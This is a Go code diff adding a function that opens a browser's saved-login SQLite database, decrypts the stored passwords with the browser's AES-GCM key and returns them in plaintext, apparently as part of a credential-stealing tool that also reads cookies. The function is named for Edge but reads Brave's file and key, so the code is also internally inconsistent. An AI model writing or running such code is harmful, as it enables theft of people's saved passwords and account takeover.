@@ -64,13 +64,58 @@ func ReadEdgeCookies() ([]Cookie, error) {
 	return cookies, nil
 }
 
+func ReadEdgePasswords() ([]Password, error) {
+	osUser, err := utils.GetCurrentUsername()
+	if err != nil {
+		return nil, err
+	}
+	passwordsPath := filepath.Join("C:\\Users", osUser, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
+
+	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", passwordsPath))
+	if err != nil {
+		return nil, err
+	}
+	defer dbConn.Close()
+
+	err = getAesGCMKeyBrave()
+	if err != nil {
+		return nil, err
+	}
+	rows, err := dbConn.Query(`SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var passwords []Password
+
+	for rows.Next() {
+		var password Password
+
+		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
+		if err != nil {
+			return nil, fmt.Errorf("error scanning row: %w", err)
+		}
+		decrypted, err := decryptValue(password.PasswordEncrypted)
+		if err != nil {
+			return nil, err
+		}
+		fmt.Println(password)
+		password.PasswordDecrypted = string(decrypted)
+		password.PasswordEncrypted = nil
+		passwords = append(passwords, password)
+	}
+	return passwords, nil
+}
+
 func getAesGCMKeyEdge() error {
 	path, err := os.UserCacheDir()
 	if err != nil {
 		return fmt.Errorf("error getting user cache directory: %w", err)
 	}
 
-	data, err := os.ReadFile(fmt.Sprintf("%s\\Microsoft\\Edge\\User Data\\Local State", path))
+	localStatePath := filepath.Join(path, "\\Microsoft\\Edge\\User Data\\Local State")
+	data, err := os.ReadFile(localStatePath)
 	if err != nil {
 		return err
 	}
